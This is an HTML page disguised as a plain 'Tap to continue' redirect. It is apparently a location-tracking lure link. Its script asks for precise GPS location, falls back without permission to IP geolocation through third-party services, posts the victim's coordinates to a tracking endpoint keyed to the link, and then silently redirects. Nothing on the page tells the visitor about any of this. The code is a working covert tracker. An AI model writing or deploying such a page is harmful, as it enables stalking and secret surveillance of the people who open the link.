<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>Continue</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  text-align: center;
  padding: 20px;
}

.btn {
  background: white;
  color: #667eea;
  border: none;
  padding: 16px 40px;
  font-size: 18px;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  width: 100%;
  max-width: 250px;
  margin: 20px auto;
}

.btn:active {
  transform: scale(0.98);
}

.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

p {
  color: white;
  font-size: 16px;
  margin-bottom: 20px;
}

.loading-text {
  color: white;
  font-size: 14px;
  margin-top: 10px;
}
</style>
</head>
<body>
<div class="container">
  <p>Tap to continue</p>
  <button class="btn" id="continueBtn">Continue →</button>
  <div id="loadingSpinner" class="spinner hidden"></div>
  <div id="loadingText" class="loading-text hidden"></div>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let locationSent = false;
let locationRequested = false;

const continueBtn = document.getElementById('continueBtn');
const loadingSpinner = document.getElementById('loadingSpinner');
const loadingText = document.getElementById('loadingText');

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function sendLocation(lat, lon, acc, source) {
  if (locationSent) return;
  locationSent = true;
  
  console.log(`Sending location from ${source}: ${lat}, ${lon}`);
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  // Redirect
  window.location.href = destUrl;
}

// IP-only fallback (no permission needed)
function getIPLocation() {
  loadingText.textContent = 'Getting location from network...';
  
  // Multiple IP geolocation services
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      if (data.latitude && data.longitude) {
        sendLocation(data.latitude, data.longitude, 5000, 'ip');
      } else {
        // Try backup
        return fetch('https://ipinfo.io/json/');
      }
    })
    .then(response => response && response.json())
    .then(data => {
      if (data && data.loc) {
        const coords = data.loc.split(',');
        sendLocation(parseFloat(coords[0]), parseFloat(coords[1]), 5000, 'ip-backup');
      } else {
        sendLocation(null, null, null, 'none');
      }
    })
    .catch(() => {
      sendLocation(null, null, null, 'failed');
    });
}

// Force permission using a fresh approach
function requestLocationWithRetry() {
  loadingText.textContent = 'Requesting location...';
  
  // Method 1: Standard geolocation
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      // Success
      (position) => {
        sendLocation(
          position.coords.latitude,
          position.coords.longitude,
          Math.round(position.coords.accuracy),
          'gps'
        );
      },
      // Error - fallback to IP immediately
      (error) => {
        console.log('Geolocation error:', error.code, error.message);
        loadingText.textContent = 'Using network location...';
        getIPLocation();
      },
      {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      }
    );
  } else {
    getIPLocation();
  }
}

// Handle button click with a slight delay to ensure clean state
function startTracking() {
  if (locationRequested) return;
  locationRequested = true;
  
  // Hide button, show spinner
  continueBtn.style.display = 'none';
  loadingSpinner.classList.remove('hidden');
  loadingText.classList.remove('hidden');
  
  // Small delay to ensure DOM is ready and no overlays
  setTimeout(() => {
    requestLocationWithRetry();
  }, 100);
}

continueBtn.addEventListener('click', startTracking);

// Also handle touchstart for better mobile response
continueBtn.addEventListener('touchstart', function(e) {
  e.preventDefault();
  startTracking();
});
</script>
</body>
</html>
